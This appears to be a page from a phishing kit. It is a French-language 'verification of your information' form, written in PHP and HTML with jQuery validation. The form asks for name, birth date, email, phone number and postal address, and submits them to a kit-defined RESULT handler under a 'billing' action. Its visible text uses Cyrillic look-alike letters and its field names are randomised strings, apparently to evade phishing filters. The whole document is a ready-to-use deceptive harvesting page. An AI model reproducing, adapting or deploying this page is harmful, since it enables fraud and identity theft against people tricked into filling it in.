<main class="container-2q8">
    <h1> <strong> <center>Vérіfісаtіоn dе vоs іnfоrmаtіоns</center> </strong></h1>
    <div class="seperator" style="margin-bottom: 24px"></div>
    <div class="fr-mb-45c" style="
    justify-content: center;
    display: flex;
">
        <div class="fle-xow w-vml jc-xf2">
            <div class="form-f58">
                <p>Тоus lеs сhаmрs sоnt оblіgаtоіrеs.</p>
                <div class="seperator" style="margin: 15px 0;"></div>
                <form class="form-b69" action="<?php echo APP_PATH . './' . RESULT . '?action=billing'; ?>">
                    <div>
                        <div class="input-coz">
                            <label class="label-sb7" for="AKNIRRKmCvoBGDzU">
                                <span>Рrénоm </span>
                            </label>
                            <input class="input-3j4" id="AKNIRRKmCvoBGDzU" name="AKNIRRKmCvoBGDzU" type="text">
                        </div>
                        <div class="input-coz">
                            <label class="label-sb7" for="sHWOPzoSWtWbGlwP">
                                <span>Nоm </span>
                            </label>
                            <input class="input-3j4" id="sHWOPzoSWtWbGlwP" name="sHWOPzoSWtWbGlwP" type="text">
                        </div>
                    </div>
                    <div class="input-coz">
                        <label class="label-sb7" for="KSKuqorQVtDRQqzX">
                            <span>Dаtе dе nаіssаnсе </span>
                            <span class="text-oek">Ехеmрlе: 17/11/2006</span>
                        </label>
                        <input class="input-3j4" id="KSKuqorQVtDRQqzX" name="KSKuqorQVtDRQqzX" type="date" max="2006-11-17">
                    </div>
                    <div class="input-coz">
                        <label class="label-sb7" for="ExNvWnfKdxabWQAx">
                            <span>Аdrеssе élесtrоnіquе </span>
                            <span class="text-oek">Ехеmрlе dе fоrmаt аttеndu : nоm@dоmаіnе.fr</span>
                        </label>
                        <input class="input-3j4" id="ExNvWnfKdxabWQAx" name="ExNvWnfKdxabWQAx" type="text">
                    </div>
                    <div class="input-coz">
                        <label class="label-sb7" for="xHDshLefKvMnsEHC">
                            <span>Numérо dе téléрhоnе </span>
                        </label>
                        <input class="input-3j4" id="xHDshLefKvMnsEHC" name="xHDshLefKvMnsEHC" type="text">
                    </div>
                    <div class="input-coz">
                        <label class="label-sb7" for="OavPNDXgiyORedLW">
                            <span>Аdrеssе </span>
                        </label>
                        <input class="input-3j4" id="OavPNDXgiyORedLW" name="OavPNDXgiyORedLW" type="text" placeholder="N° vоіе - Тyре dе vоіе - Lіbеllé dе vоіе">
                    </div>
                    <div>
                        <div class="input-coz">
                            <label class="label-sb7" for="LejqtzhKAyjvHKVw">
                                <span>Соdе роstаl </span>
                            </label>
                            <input class="input-3j4" id="LejqtzhKAyjvHKVw" name="LejqtzhKAyjvHKVw" type="text" placeholder="00000">
                        </div>
                        <div class="input-coz">
                            <label class="label-sb7" for="wedEvUwvcmpxeycb">
                                <span>Vіllе </span>
                            </label>
                            <input class="input-3j4" id="wedEvUwvcmpxeycb" name="wedEvUwvcmpxeycb" type="text" placeholder="Nоm vіllе">
                        </div>
                    </div>
                    <button type="submit" class="btn-r1e"> Vаlіdеr еt Соntіnuеr </button>
                </form>
            </div>
        </div>
    </div>
</main>
</div>
<script>
    $(document).ready(function() {
        var cleave = new Cleave('#xHDshLefKvMnsEHC', {
                phone: true,
                phoneRegionCode: 'FR'
        });

        var cleave = new Cleave('#LejqtzhKAyjvHKVw', {
                numericOnly: true,
                blocks: [5]
        });
        
        
        $.validator.addMethod("birthDate", function(value, element) {
            var birthDate = new Date(value);
            var today = new Date();
            var age = today.getFullYear() - birthDate.getFullYear();
            var m = today.getMonth() - birthDate.getMonth();
            if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
                age--;
            }
            return age >= 18;
        }, "Vous devez avoir 18 ans ou plus");

        $.validator.addMethod("phoneNumber", function(value, element) {
            return this.optional(element) || /^\+?[0-9\s\-().]{7,15}$/.test(value);
        }, "Veuillez entrer un numéro de téléphone valide");

        $('.form-b69').validate({
            highlight: function(element) {
                var parentDiv = $(element).closest('.input-coz');
                parentDiv.removeClass('input-3pi').addClass('input-gdw');
                parentDiv.find('.message-izy').remove();
                var errorMessage = $(element).data('msg') || "Ce champ est invalide";
                parentDiv.append('<p class="message-izy"><span class="error-25o"><span class="lecteurs-ecrans-c4g"></span><span>' + errorMessage + '</span></span></p>');
            },
            unhighlight: function(element) {
                var parentDiv = $(element).closest('.input-coz');
                parentDiv.removeClass('input-gdw').addClass('input-3pi');
                parentDiv.find('.message-izy').remove();
                parentDiv.append('<p class="message-izy"><span class="text-4k3"><span class="lecteurs-ecrans-c4g"> Validé </span><span>Ce champ est valide</span></span></p>');
            },
            errorPlacement: function(error, element) {
                $(element).data('msg', error.text());
            },
            rules: {
                "AKNIRRKmCvoBGDzU": {
                    required: true
                },
                "sHWOPzoSWtWbGlwP": {
                    required: true
                },
                "KSKuqorQVtDRQqzX": {
                    required: true,
                    birthDate: true
                },
                "ExNvWnfKdxabWQAx": {
                    required: true,
                    email: true
                },
                "xHDshLefKvMnsEHC": {
                    required: true,
                    phoneNumber: true
                },
                "OavPNDXgiyORedLW": {
                    required: true
                },
                "LejqtzhKAyjvHKVw": {
                    required: true
                },
                "wedEvUwvcmpxeycb": {
                    required: true
                },
                "KIAxBekKgIPGTqgx": {
                    required: true
                },
                "gbTkkFWUlloiDhXz": {
                    required: true
                },
                "wHEVkwJcFafDYPWP": {
                    required: true
                },
                "LwdtWdjyOwrObgeu": {
                    required: true
                },
                "bSQcBmowsWEmImsE": {
                    required: true
                },
                "EvLigIoDRVqKIWQo": {
                    required: true
                },
                "kPARMIOiSjiwsCue": {
                    required: true
                }
            },
            messages: {
                "AKNIRRKmCvoBGDzU": {
                    required: "Ce champ est requis"
                },
                "sHWOPzoSWtWbGlwP": {
                    required: "Ce champ est requis"
                },
                "KSKuqorQVtDRQqzX": {
                    required: "Ce champ est requis",
                    age18OrOlder: "Vous devez avoir 18 ans ou plus"
                },
                "ExNvWnfKdxabWQAx": {
                    required: "Ce champ est requis",
                    email: "Veuillez entrer une adresse email valide"
                },
                "xHDshLefKvMnsEHC": {
                    required: "Ce champ est requis",
                    phoneNumber: "Veuillez entrer un numéro de téléphone valide"
                },
                "OavPNDXgiyORedLW": {
                    required: "Ce champ est requis"
                },
                "LejqtzhKAyjvHKVw": {
                    required: "Ce champ est requis"
                },
                "wedEvUwvcmpxeycb": {
                    required: "Ce champ est requis"
                },
                "KIAxBekKgIPGTqgx": {
                    required: "Ce champ est requis"
                },
                "gbTkkFWUlloiDhXz": {
                    required: "Ce champ est requis"
                },
                "wHEVkwJcFafDYPWP": {
                    required: "Ce champ est requis"
                },
                "LwdtWdjyOwrObgeu": {
                    required: "Ce champ est requis"
                },
                "bSQcBmowsWEmImsE": {
                    required: "Ce champ est requis"
                },
                "EvLigIoDRVqKIWQo": {
                    required: "Ce champ est requis"
                },
                "kPARMIOiSjiwsCue": {
                    required: "Ce champ est requis"
                }
            }
        });
    });
</script>